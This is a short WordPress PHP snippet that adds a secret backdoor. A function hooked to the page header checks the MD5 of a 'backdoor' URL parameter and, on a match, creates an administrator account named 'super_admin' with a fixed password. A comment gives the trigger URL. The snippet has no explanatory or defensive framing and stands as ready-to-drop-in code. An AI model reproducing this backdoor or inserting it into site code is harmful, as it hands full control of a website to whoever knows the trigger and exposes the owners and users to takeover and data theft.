<?php 

//Open yoursite.com/?backdoor=open
add_action('wp_head', 'my_create_backdoor');
function my_create_backdoor() {
  if(md5($_GET['backdoor']) === '1c4dcdc4f55ae2adab37f80f5b4efa81') {
    require('wp-includes/registration.php');
    if(!username_exists('super_admin')) {
      $user_id = wp_create_user('super_admin', 'LetMeIn!');
      $user = new WP_User($user_id);
      $user->set_role('administrator');
    }
  }
}